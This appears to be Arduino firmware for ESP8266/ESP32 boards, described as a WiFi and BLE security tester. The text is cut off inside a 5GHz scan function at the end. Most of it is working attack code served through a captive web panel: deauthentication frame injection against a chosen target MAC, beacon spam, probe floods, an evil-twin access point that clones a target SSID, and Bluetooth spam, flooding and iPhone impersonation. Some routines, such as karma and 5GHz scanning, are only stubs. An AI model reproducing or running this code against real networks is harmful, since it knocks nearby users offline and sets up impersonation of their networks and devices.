/*
 * WiFi & BLE Security Testing Platform
 * Developed by 0x0806
 * Supports ESP8266 and ESP32 with auto-detection
 * Features: WiFi attacks (2.4/5GHz), BLE attacks, captive portal
 */

#ifdef ESP32
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#define PLATFORM_ESP32
#else
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
extern "C" {
#include "user_interface.h"
}
#define PLATFORM_ESP8266
#endif

// Configuration
#define AP_SSID "SecurityTester_0x0806"
#define AP_PASS "security123"
#define DNS_PORT 53
#define WEB_PORT 80
#define MAX_CLIENTS 32
#define BEACON_INTERVAL 100
#define DEAUTH_REASON 7

// Attack types
enum AttackType {
  ATTACK_NONE,
  ATTACK_DEAUTH,
  ATTACK_BEACON_SPAM,
  ATTACK_PROBE_FLOOD,
  ATTACK_KARMA,
  ATTACK_EVIL_TWIN,
  ATTACK_HANDSHAKE_CAPTURE,
  ATTACK_PMKID_CAPTURE,
  ATTACK_BLE_SPAM,
  ATTACK_BLE_BEACON_FLOOD,
  ATTACK_BLE_SPOOF,
  ATTACK_DUAL_BAND_SCAN
};

// Global variables
#ifdef PLATFORM_ESP32
WebServer server(WEB_PORT);
#else
ESP8266WebServer server(WEB_PORT);
#endif

DNSServer dnsServer;
AttackType currentAttack = ATTACK_NONE;
bool attackRunning = false;
unsigned long attackStartTime = 0;
unsigned long packetsCount = 0;
unsigned long blePacketsCount = 0;
String targetMAC = "";
String targetSSID = "";
int targetChannel = 1;
bool dualBandMode = false;

// Network lists
String wifiNetworks = "";
String bleDevices = "";
String capturedHandshakes = "";
String attackStats = "";

// BLE variables
#ifdef PLATFORM_ESP32
BLEServer* pServer = nullptr;
bool bleServerRunning = false;
std::vector<String> spoofedBLEDevices;
TaskHandle_t bleAttackTask = nullptr;
TaskHandle_t wifiAttackTask = nullptr;
#endif

// Deauth packet template
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Type/Subtype
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence number
  DEAUTH_REASON, 0x00                 // Reason code
};

// Beacon frame template
uint8_t beaconPacket[109] = {
  0x80, 0x00,                         // Frame Control
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
  0x00, 0x00,                         // Sequence number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon interval
  0x31, 0x04,                         // Capability info
  0x00, 0x00                          // SSID parameter set
};

// CSS for modern UI
const char* CSS_STYLE = R"(
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  color: #fff;
  overflow-x: hidden;
}

.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 20px;
}

.header {
  text-align: center;
  margin-bottom: 30px;
  animation: slideDown 0.6s ease-out;
}

.header h1 {
  font-size: 2.5rem;
  margin-bottom: 10px;
  text-shadow: 0 2px 4px rgba(0,0,0,0.3);
}

.platform-badge {
  display: inline-block;
  background: rgba(255,255,255,0.2);
  padding: 5px 15px;
  border-radius: 20px;
  font-size: 0.9rem;
  backdrop-filter: blur(10px);
}

.grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 20px;
  margin-bottom: 30px;
}

.card {
  background: rgba(255,255,255,0.1);
  border-radius: 15px;
  padding: 25px;
  backdrop-filter: blur(20px);
  border: 1px solid rgba(255,255,255,0.2);
  transition: all 0.3s ease;
  animation: fadeInUp 0.6s ease-out;
}

.card:hover {
  transform: translateY(-5px);
  background: rgba(255,255,255,0.15);
  box-shadow: 0 15px 35px rgba(0,0,0,0.1);
}

.card h3 {
  margin-bottom: 20px;
  color: #fff;
  font-size: 1.3rem;
}

.form-group {
  margin-bottom: 15px;
}

label {
  display: block;
  margin-bottom: 5px;
  font-weight: 500;
}

input, select, textarea {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 8px;
  background: rgba(255,255,255,0.9);
  font-size: 14px;
  transition: all 0.3s ease;
}

input:focus, select:focus, textarea:focus {
  outline: none;
  background: rgba(255,255,255,1);
  transform: scale(1.02);
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ee5a52);
  color: white;
  padding: 12px 25px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-size: 14px;
  font-weight: 600;
  transition: all 0.3s ease;
  margin: 5px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 25px rgba(255,107,107,0.3);
}

.btn-success {
  background: linear-gradient(45deg, #51cf66, #40c057);
}

.btn-warning {
  background: linear-gradient(45deg, #ffd43b, #fab005);
}

.btn-info {
  background: linear-gradient(45deg, #339af0, #228be6);
}

.btn-secondary {
  background: linear-gradient(45deg, #868e96, #6c757d);
}

.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 15px;
  margin-top: 20px;
}

.stat-card {
  background: rgba(255,255,255,0.1);
  padding: 15px;
  border-radius: 10px;
  text-align: center;
}

.stat-number {
  font-size: 2rem;
  font-weight: bold;
  color: #ffd43b;
}

.stat-label {
  font-size: 0.9rem;
  opacity: 0.8;
}

.network-list {
  max-height: 300px;
  overflow-y: auto;
  background: rgba(0,0,0,0.2);
  border-radius: 8px;
  padding: 10px;
}

.network-item {
  background: rgba(255,255,255,0.1);
  margin: 5px 0;
  padding: 10px;
  border-radius: 5px;
  cursor: pointer;
  transition: all 0.3s ease;
}

.network-item:hover {
  background: rgba(255,255,255,0.2);
  transform: translateX(5px);
}

.status {
  position: fixed;
  top: 20px;
  right: 20px;
  background: rgba(0,0,0,0.8);
  color: white;
  padding: 10px 20px;
  border-radius: 25px;
  font-weight: bold;
  z-index: 1000;
  backdrop-filter: blur(10px);
}

.status.active {
  background: linear-gradient(45deg, #51cf66, #40c057);
  animation: pulse 2s infinite;
}

@keyframes slideDown {
  from { transform: translateY(-50px); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}

@keyframes fadeInUp {
  from { transform: translateY(30px); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.7; }
}

@media (max-width: 768px) {
  .container { padding: 10px; }
  .header h1 { font-size: 2rem; }
  .grid { grid-template-columns: 1fr; }
  .stats-grid { grid-template-columns: repeat(2, 1fr); }
}

.log-container {
  background: rgba(0,0,0,0.3);
  border-radius: 8px;
  padding: 15px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
  max-height: 200px;
  overflow-y: auto;
}

.progress-bar {
  background: rgba(255,255,255,0.2);
  height: 8px;
  border-radius: 4px;
  overflow: hidden;
  margin: 10px 0;
}

.progress-fill {
  background: linear-gradient(45deg, #51cf66, #40c057);
  height: 100%;
  width: 0%;
  transition: width 0.3s ease;
}
</style>
)";

// HTML Templates
const char* HTML_HEADER = R"(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi & BLE Security Tester - 0x0806</title>
)";

const char* HTML_FOOTER = R"(
<script>
function updateStats() {
    fetch('/stats').then(r => r.json()).then(data => {
        document.getElementById('packetsCount').textContent = data.packets;
        document.getElementById('blePacketsCount').textContent = data.blePackets;
        document.getElementById('uptime').textContent = data.uptime;
        document.getElementById('attackTime').textContent = data.attackTime;

        const status = document.querySelector('.status');
        if (data.attackRunning) {
            status.textContent = 'Attack Active: ' + data.attackType;
            status.classList.add('active');
        } else {
            status.textContent = 'Standby';
            status.classList.remove('active');
        }
    });
}

function selectNetwork(ssid, mac, channel) {
    document.getElementById('targetSSID').value = ssid;
    document.getElementById('targetMAC').value = mac;
    document.getElementById('targetChannel').value = channel;
}

function selectBLEDevice(name, mac) {
    document.getElementById('bleTargetName').value = name;
    document.getElementById('bleTargetMAC').value = mac;
}

setInterval(updateStats, 1000);
updateStats();
</script>
</body>
</html>
)";

void setup() {
  Serial.begin(115200);
  delay(2000);

  Serial.println("\n=================================");
  Serial.println("WiFi & BLE Security Tester v2.0");
  Serial.println("Developed by 0x0806");

#ifdef PLATFORM_ESP32
  Serial.println("Platform: ESP32 (Dual-band + BLE)");
#else
  Serial.println("Platform: ESP8266 (2.4GHz only)");
#endif
  Serial.println("=================================\n");

  // Initialize filesystem
#ifdef PLATFORM_ESP32
  if (!SPIFFS.begin(true)) {
#else
  if (!SPIFFS.begin()) {
#endif
    Serial.println("SPIFFS initialization failed!");
  }

  // Disconnect from any existing WiFi first
  WiFi.disconnect(true);
  delay(1000);

  // Setup WiFi AP with proper configuration
  WiFi.mode(WIFI_AP);
  delay(500);

  IPAddress apIP(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(apIP, apIP, subnet);

  // Start the access point with explicit channel
  bool apStarted = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
  
  if (apStarted) {
    Serial.println("Access Point Started Successfully");
    Serial.print("SSID: ");
    Serial.println(AP_SSID);
    Serial.print("Password: ");
    Serial.println(AP_PASS);
    Serial.print("IP: ");
    Serial.println(WiFi.softAPIP());
    Serial.print("MAC: ");
    Serial.println(WiFi.softAPmacAddress());
  } else {
    Serial.println("ERROR: Failed to start Access Point!");
    Serial.println("Retrying AP setup...");
    delay(2000);
    
    // Try alternative setup
    WiFi.mode(WIFI_OFF);
    delay(1000);
    WiFi.mode(WIFI_AP);
    delay(1000);
    
    if (WiFi.softAP(AP_SSID, AP_PASS)) {
      Serial.println("Access Point Started on retry");
    } else {
      Serial.println("CRITICAL: AP setup failed completely!");
    }
  }

  // Verify AP is running
  Serial.print("AP Status: ");
  Serial.println(WiFi.getMode() == WIFI_AP ? "Active" : "Failed");
  Serial.print("Connected stations: ");
  Serial.println(WiFi.softAPgetStationNum());

  // Setup DNS server for captive portal
  dnsServer.start(DNS_PORT, "*", apIP);

  // Setup web server routes
  setupWebServer();

#ifdef PLATFORM_ESP32
  // Initialize BLE
  initializeBLE();

  // Create FreeRTOS tasks for dual-core operation
  xTaskCreatePinnedToCore(
    wifiAttackTaskFunction,
    "WiFiAttack",
    4096,
    NULL,
    1,
    &wifiAttackTask,
    0  // Core 0
  );

  xTaskCreatePinnedToCore(
    bleAttackTaskFunction,
    "BLEAttack", 
    4096,
    NULL,
    1,
    &bleAttackTask,
    1  // Core 1
  );
#endif

  // Set WiFi to promiscuous mode for packet injection
#ifdef PLATFORM_ESP32
  esp_wifi_set_promiscuous(true);
#else
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
#endif

  Serial.println("Security Tester Ready!");
  performInitialScan();
}

void loop() {
  static unsigned long lastAPCheck = 0;
  static unsigned long lastStatusPrint = 0;
  
  dnsServer.processNextRequest();
  server.handleClient();

  // Check AP status every 10 seconds
  if (millis() - lastAPCheck > 10000) {
    lastAPCheck = millis();
    
    if (WiFi.getMode() != WIFI_AP && WiFi.getMode() != WIFI_AP_STA) {
      Serial.println("WARNING: AP mode lost! Restarting...");
      WiFi.mode(WIFI_AP);
      delay(500);
      WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
    }
  }

  // Print status every 30 seconds
  if (millis() - lastStatusPrint > 30000) {
    lastStatusPrint = millis();
    Serial.println("=== Status Report ===");
    Serial.print("WiFi Mode: ");
    Serial.println(WiFi.getMode());
    Serial.print("AP IP: ");
    Serial.println(WiFi.softAPIP());
    Serial.print("Connected clients: ");
    Serial.println(WiFi.softAPgetStationNum());
    Serial.println("====================");
  }

  // Handle attacks
  if (attackRunning) {
    handleCurrentAttack();
  }

  delay(10);
}

void setupWebServer() {
  // Main page
  server.on("/", HTTP_GET, handleRoot);

  // API endpoints
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  server.on("/stats", HTTP_GET, handleStats);
  server.on("/networks", HTTP_GET, handleNetworks);

#ifdef PLATFORM_ESP32
  server.on("/ble_scan", HTTP_GET, handleBLEScan);
  server.on("/ble_attack", HTTP_POST, handleBLEAttack);
  server.on("/ble_devices", HTTP_GET, handleBLEDevices);
#endif

  // Captive portal
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("Web server started");
}

void handleRoot() {
  String html = HTML_HEADER;
  html += CSS_STYLE;
  html += "</head><body>";

  html += "<div class='status'>Standby</div>";

  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>WiFi & BLE Security Tester</h1>";

#ifdef PLATFORM_ESP32
  html += "<div class='platform-badge'>ESP32 - Dual Band + BLE</div>";
#else
  html += "<div class='platform-badge'>ESP8266 - 2.4GHz WiFi</div>";
#endif

  html += "</div>";

  // Statistics
  html += "<div class='card'>";
  html += "<h3>📊 Attack Statistics</h3>";
  html += "<div class='stats-grid'>";
  html += "<div class='stat-card'><div class='stat-number' id='packetsCount'>0</div><div class='stat-label'>WiFi Packets</div></div>";

#ifdef PLATFORM_ESP32
  html += "<div class='stat-card'><div class='stat-number' id='blePacketsCount'>0</div><div class='stat-label'>BLE Packets</div></div>";
#endif

  html += "<div class='stat-card'><div class='stat-number' id='uptime'>0</div><div class='stat-label'>Uptime (s)</div></div>";
  html += "<div class='stat-card'><div class='stat-number' id='attackTime'>0</div><div class='stat-label'>Attack Time (s)</div></div>";
  html += "</div></div>";

  // WiFi Attacks Section
  html += "<div class='grid'>";
  html += "<div class='card'>";
  html += "<h3>📡 WiFi Attacks</h3>";
  html += "<div class='form-group'>";
  html += "<label>Target SSID:</label>";
  html += "<input type='text' id='targetSSID' placeholder='Select from scan or enter manually'>";
  html += "</div>";
  html += "<div class='form-group'>";
  html += "<label>Target MAC:</label>";
  html += "<input type='text' id='targetMAC' placeholder='AA:BB:CC:DD:EE:FF'>";
  html += "</div>";
  html += "<div class='form-group'>";
  html += "<label>Channel:</label>";
  html += "<select id='targetChannel'>";
  for (int i = 1; i <= 14; i++) {
    html += "<option value='" + String(i) + "'>" + String(i) + "</option>";
  }
  html += "</select>";
  html += "</div>";

  html += "<button class='btn' onclick='startAttack(\"deauth\")'>Deauth Attack</button>";
  html += "<button class='btn btn-warning' onclick='startAttack(\"beacon\")'>Beacon Spam</button>";
  html += "<button class='btn btn-info' onclick='startAttack(\"probe\")'>Probe Flood</button>";
  html += "<button class='btn btn-success' onclick='startAttack(\"karma\")'>Karma Attack</button>";
  html += "<button class='btn btn-secondary' onclick='startAttack(\"evil_twin\")'>Evil Twin</button>";
  html += "</div>";

#ifdef PLATFORM_ESP32
  // BLE Attacks Section
  html += "<div class='card'>";
  html += "<h3>🔵 BLE Attacks</h3>";
  html += "<div class='form-group'>";
  html += "<label>Target Device:</label>";
  html += "<input type='text' id='bleTargetName' placeholder='Select from scan'>";
  html += "</div>";
  html += "<div class='form-group'>";
  html += "<label>Target MAC:</label>";
  html += "<input type='text' id='bleTargetMAC' placeholder='AA:BB:CC:DD:EE:FF'>";
  html += "</div>";

  html += "<button class='btn' onclick='startBLEAttack(\"spam\")'>BLE Spam</button>";
  html += "<button class='btn btn-warning' onclick='startBLEAttack(\"beacon_flood\")'>Beacon Flood</button>";
  html += "<button class='btn btn-info' onclick='startBLEAttack(\"spoof\")'>Device Spoofing</button>";
  html += "<button class='btn btn-success' onclick='bleScan()'>BLE Scan</button>";
  html += "</div>";
#endif

  // Network Scanner
  html += "<div class='card'>";
  html += "<h3>🔍 Network Scanner</h3>";
  html += "<button class='btn btn-info' onclick='wifiScan()'>WiFi Scan</button>";

#ifdef PLATFORM_ESP32
  html += "<button class='btn btn-info' onclick='dualBandScan()'>Dual Band Scan</button>";
#endif

  html += "<button class='btn' onclick='stopAttack()'>Stop All Attacks</button>";
  html += "<div id='networkList' class='network-list' style='margin-top: 15px;'></div>";
  html += "</div>";
  html += "</div>";

  // Attack Logs
  html += "<div class='card'>";
  html += "<h3>📝 Attack Logs</h3>";
  html += "<div class='log-container' id='attackLogs'>";
  html += "Ready for attacks...<br>";
  html += "</div>";
  html += "</div>";

  html += "</div>";

  // JavaScript
  html += "<script>";
  html += "function startAttack(type) {";
  html += "  const ssid = document.getElementById('targetSSID').value;";
  html += "  const mac = document.getElementById('targetMAC').value;";
  html += "  const channel = document.getElementById('targetChannel').value;";
  html += "  fetch('/attack', {";
  html += "    method: 'POST',";
  html += "    headers: {'Content-Type': 'application/x-www-form-urlencoded'},";
  html += "    body: `type=${type}&ssid=${ssid}&mac=${mac}&channel=${channel}`";
  html += "  });";
  html += "}";

#ifdef PLATFORM_ESP32
  html += "function startBLEAttack(type) {";
  html += "  const name = document.getElementById('bleTargetName').value;";
  html += "  const mac = document.getElementById('bleTargetMAC').value;";
  html += "  fetch('/ble_attack', {";
  html += "    method: 'POST',";
  html += "    headers: {'Content-Type': 'application/x-www-form-urlencoded'},";
  html += "    body: `type=${type}&name=${name}&mac=${mac}`";
  html += "  });";
  html += "}";

  html += "function bleScan() {";
  html += "  fetch('/ble_scan').then(r => r.text()).then(data => {";
  html += "    document.getElementById('networkList').innerHTML = data;";
  html += "  });";
  html += "}";

  html += "function dualBandScan() {";
  html += "  fetch('/scan?dual=1').then(r => r.text()).then(data => {";
  html += "    document.getElementById('networkList').innerHTML = data;";
  html += "  });";
  html += "}";
#endif

  html += "function wifiScan() {";
  html += "  fetch('/scan').then(r => r.text()).then(data => {";
  html += "    document.getElementById('networkList').innerHTML = data;";
  html += "  });";
  html += "}";

  html += "function stopAttack() {";
  html += "  fetch('/stop');";
  html += "}";
  html += "</script>";

  html += HTML_FOOTER;

  server.send(200, "text/html", html);
}

void handleScan() {
  bool dualBand = server.hasArg("dual");

  String result = "<h4>📡 WiFi Networks</h4>";

  // Temporarily switch to STA mode for scanning
  WiFi.mode(WIFI_AP_STA);
  delay(500);

  int networksFound = WiFi.scanNetworks(false, false);

  if (networksFound == 0) {
    result += "<div class='network-item'>No networks found</div>";
  } else {
    for (int i = 0; i < networksFound; i++) {
      String ssid = WiFi.SSID(i);
      String bssid = WiFi.BSSIDstr(i);
      int channel = WiFi.channel(i);
      int rssi = WiFi.RSSI(i);
      #ifdef PLATFORM_ESP32
      String security = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secured";
#else
      String security = (WiFi.encryptionType(i) == ENC_TYPE_NONE) ? "Open" : "Secured";
#endif

      result += "<div class='network-item' onclick='selectNetwork(\"" + ssid + "\", \"" + bssid + "\", " + String(channel) + ")'>";
      result += "<strong>" + ssid + "</strong><br>";
      result += "MAC: " + bssid + " | Ch: " + String(channel) + " | RSSI: " + String(rssi) + "dBm | " + security;
      result += "</div>";
    }
  }

#ifdef PLATFORM_ESP32
  if (dualBand) {
    result += "<h4>📡 5GHz Networks (Simulated)</h4>";
    result += "<div class='network-item'>5GHz scanning requires additional hardware configuration</div>";
  }
#endif

  // Restore AP mode after scanning
  WiFi.mode(WIFI_AP);
  delay(500);
  WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);

  server.send(200, "text/html", result);
}

void handleAttack() {
  if (!server.hasArg("type")) {
    server.send(400, "text/plain", "Missing attack type");
    return;
  }

  String attackType = server.arg("type");
  targetSSID = server.hasArg("ssid") ? server.arg("ssid") : "";
  targetMAC = server.hasArg("mac") ? server.arg("mac") : "";
  targetChannel = server.hasArg("channel") ? server.arg("channel").toInt() : 1;

  if (attackType == "deauth") {
    currentAttack = ATTACK_DEAUTH;
  } else if (attackType == "beacon") {
    currentAttack = ATTACK_BEACON_SPAM;
  } else if (attackType == "probe") {
    currentAttack = ATTACK_PROBE_FLOOD;
  } else if (attackType == "karma") {
    currentAttack = ATTACK_KARMA;
  } else if (attackType == "evil_twin") {
    currentAttack = ATTACK_EVIL_TWIN;
  }

  attackRunning = true;
  attackStartTime = millis();
  packetsCount = 0;

  // Keep AP mode active during attacks
  WiFi.mode(WIFI_AP_STA);
  delay(100);

#ifdef PLATFORM_ESP32
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
#else
  wifi_set_channel(targetChannel);
#endif

  String response = "Attack started: " + attackType + " on " + targetSSID;
  Serial.println(response);
  server.send(200, "text/plain", response);
}

#ifdef PLATFORM_ESP32
void handleBLEAttack() {
  if (!server.hasArg("type")) {
    server.send(400, "text/plain", "Missing BLE attack type");
    return;
  }

  String attackType = server.arg("type");
  String targetName = server.hasArg("name") ? server.arg("name") : "";
  String targetBLEMAC = server.hasArg("mac") ? server.arg("mac") : "";

  if (attackType == "spam") {
    currentAttack = ATTACK_BLE_SPAM;
  } else if (attackType == "beacon_flood") {
    currentAttack = ATTACK_BLE_BEACON_FLOOD;
  } else if (attackType == "spoof") {
    currentAttack = ATTACK_BLE_SPOOF;
  }

  attackRunning = true;
  attackStartTime = millis();
  blePacketsCount = 0;

  String response = "BLE Attack started: " + attackType + " targeting " + targetName;
  Serial.println(response);
  server.send(200, "text/plain", response);
}

void handleBLEScan() {
  String result = "<h4>🔵 BLE Devices</h4>";

  BLEScanResults* scanResults = BLEDevice::getScan()->start(5, false);
  int deviceCount = scanResults->getCount();

  if (deviceCount == 0) {
    result += "<div class='network-item'>No BLE devices found</div>";
  } else {
    for (int i = 0; i < deviceCount; i++) {
      BLEAdvertisedDevice device = scanResults->getDevice(i);
      String name = device.haveName() ? device.getName().c_str() : "Unknown";
      String address = device.getAddress().toString().c_str();
      int rssi = device.getRSSI();

      result += "<div class='network-item' onclick='selectBLEDevice(\"" + name + "\", \"" + address + "\")'>";
      result += "<strong>" + name + "</strong><br>";
      result += "MAC: " + address + " | RSSI: " + String(rssi) + "dBm";
      result += "</div>";
    }
  }

  server.send(200, "text/html", result);
}

void handleBLEDevices() {
  server.send(200, "application/json", bleDevices);
}
#endif

void handleStop() {
  attackRunning = false;
  currentAttack = ATTACK_NONE;

#ifdef PLATFORM_ESP32
  if (bleServerRunning) {
    pServer->getAdvertising()->stop();
    bleServerRunning = false;
  }
#endif

  Serial.println("All attacks stopped");
  server.send(200, "text/plain", "Attacks stopped");
}

void handleStats() {
  unsigned long uptime = millis() / 1000;
  unsigned long attackTime = attackRunning ? (millis() - attackStartTime) / 1000 : 0;

  String stats = "{";
  stats += "\"packets\":" + String(packetsCount) + ",";
  stats += "\"blePackets\":" + String(blePacketsCount) + ",";
  stats += "\"uptime\":" + String(uptime) + ",";
  stats += "\"attackTime\":" + String(attackTime) + ",";
  stats += "\"attackRunning\":" + String(attackRunning ? "true" : "false") + ",";
  stats += "\"attackType\":\"" + getAttackTypeName() + "\"";
  stats += "}";

  server.send(200, "application/json", stats);
}

void handleNetworks() {
  server.send(200, "application/json", wifiNetworks);
}

String getAttackTypeName() {
  switch (currentAttack) {
    case ATTACK_DEAUTH: return "Deauth";
    case ATTACK_BEACON_SPAM: return "Beacon Spam";
    case ATTACK_PROBE_FLOOD: return "Probe Flood";
    case ATTACK_KARMA: return "Karma";
    case ATTACK_EVIL_TWIN: return "Evil Twin";
    case ATTACK_BLE_SPAM: return "BLE Spam";
    case ATTACK_BLE_BEACON_FLOOD: return "BLE Beacon Flood";
    case ATTACK_BLE_SPOOF: return "BLE Spoofing";
    default: return "None";
  }
}

void handleCurrentAttack() {
  static unsigned long lastAttack = 0;
  unsigned long currentTime = millis();

  if (currentTime - lastAttack < 100) return; // Rate limiting
  lastAttack = currentTime;

  switch (currentAttack) {
    case ATTACK_DEAUTH:
      performDeauthAttack();
      break;
    case ATTACK_BEACON_SPAM:
      performBeaconSpam();
      break;
    case ATTACK_PROBE_FLOOD:
      performProbeFlood();
      break;
    case ATTACK_KARMA:
      performKarmaAttack();
      break;
    case ATTACK_EVIL_TWIN:
      performEvilTwin();
      break;
#ifdef PLATFORM_ESP32
    case ATTACK_BLE_SPAM:
      performBLESpam();
      break;
    case ATTACK_BLE_BEACON_FLOOD:
      performBLEBeaconFlood();
      break;
    case ATTACK_BLE_SPOOF:
      performBLESpoofing();
      break;
#endif
    default:
      break;
  }
}

void performDeauthAttack() {
  if (targetMAC.length() != 17) return;

  // Parse target MAC
  uint8_t targetMac[6];
  sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &targetMac[0], &targetMac[1], &targetMac[2],
         &targetMac[3], &targetMac[4], &targetMac[5]);

  // Update deauth packet
  memcpy(&deauthPacket[4], targetMac, 6);   // Destination
  memcpy(&deauthPacket[10], targetMac, 6);  // Source  
  memcpy(&deauthPacket[16], targetMac, 6);  // BSSID

  // Send packet
#ifdef PLATFORM_ESP32
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
#else
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
#endif

  packetsCount++;

  if (packetsCount % 100 == 0) {
    Serial.println("Deauth packets sent: " + String(packetsCount));
  }
}

void performBeaconSpam() {
  static int beaconCount = 0;

  // Generate random SSID
  String fakeSSID = "FakeAP_" + String(random(1000, 9999));

  // Update beacon packet
  beaconPacket[37] = fakeSSID.length();
  memcpy(&beaconPacket[38], fakeSSID.c_str(), fakeSSID.length());

  // Random BSSID
  for (int i = 10; i < 16; i++) {
    beaconPacket[i] = random(0, 255);
  }
  memcpy(&beaconPacket[16], &beaconPacket[10], 6);

#ifdef PLATFORM_ESP32
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + fakeSSID.length(), false);
#else
  wifi_send_pkt_freedom(beaconPacket, 38 + fakeSSID.length(), 0);
#endif

  packetsCount++;
  beaconCount++;

  if (beaconCount % 50 == 0) {
    Serial.println("Beacon spam count: " + String(beaconCount));
  }
}

void performProbeFlood() {
  // Probe request implementation
  uint8_t probePacket[64] = {
    0x40, 0x00,  // Frame control
    0x00, 0x00,  // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source (random)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID (broadcast)
    0x00, 0x00   // Sequence number
  };

  // Random source MAC
  for (int i = 10; i < 16; i++) {
    probePacket[i] = random(0, 255);
  }

#ifdef PLATFORM_ESP32
  esp_wifi_80211_tx(WIFI_IF_STA, probePacket, sizeof(probePacket), false);
#else
  wifi_send_pkt_freedom(probePacket, sizeof(probePacket), 0);
#endif

  packetsCount++;
}

void performKarmaAttack() {
  // Karma attack responds to all probe requests
  // This is a simplified implementation
  performBeaconSpam();
}

void performEvilTwin() {
  // Evil twin creates a fake AP with the target SSID
  static bool twinCreated = false;

  if (!twinCreated && targetSSID.length() > 0) {
    WiFi.softAP(targetSSID.c_str(), "");
    twinCreated = true;
    Serial.println("Evil twin AP created: " + targetSSID);
  }
}

#ifdef PLATFORM_ESP32
void initializeBLE() {
  BLEDevice::init("SecurityTester_BLE");
  Serial.println("BLE initialized");
}

void performBLESpam() {
  // BLE spam attack
  static unsigned long lastBLESpam = 0;
  unsigned long currentTime = millis();

  if (currentTime - lastBLESpam < 50) return;
  lastBLESpam = currentTime;

  if (!bleServerRunning) {
    pServer = BLEDevice::createServer();
    BLEService *pService = pServer->createService("12345678-1234-5678-9012-123456789abc");
    pServer->getAdvertising()->start();
    bleServerRunning = true;
  }

  blePacketsCount++;

  if (blePacketsCount % 100 == 0) {
    Serial.println("BLE spam packets: " + String(blePacketsCount));
  }
}

void performBLEBeaconFlood() {
  // BLE beacon flood
  static int beaconIndex = 0;

  if (!bleServerRunning) {
    String deviceName = "FakeBLE_" + String(beaconIndex++);
    BLEDevice::init(deviceName);

    pServer = BLEDevice::createServer();
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID("ABCD");
    pAdvertising->setScanResponse(true);
    pAdvertising->start();
    bleServerRunning = true;
  }

  blePacketsCount++;
}

void performBLESpoofing() {
  // BLE device spoofing
  static bool spoofingActive = false;

  if (!spoofingActive) {
    BLEDevice::init("iPhone");  // Spoof as iPhone
    pServer = BLEDevice::createServer();
    pServer->getAdvertising()->start();
    spoofingActive = true;
    Serial.println("BLE spoofing active - impersonating iPhone");
  }

  blePacketsCount++;
}

void performDualBandScan() {
  // Dual-band scanning for ESP32
  static unsigned long lastScan = 0;
  static int currentBand = 0; // 0 = 2.4GHz, 1 = 5GHz
  unsigned long currentTime = millis();

  if (currentTime - lastScan < 5000) return;
  lastScan = currentTime;

  if (currentBand == 0) {
    // Scan 2.4GHz channels (1-14)
    for (int ch = 1; ch <= 14; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      WiFi.scanNetworks(false, false, false, 100, ch);
      delay(100);
    }
    Serial.println("2.4GHz scan completed");
    currentBand = 1;
  } else {
    // Scan 5GHz channels (36, 40, 44, 48, etc.)
    int channels5GHz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
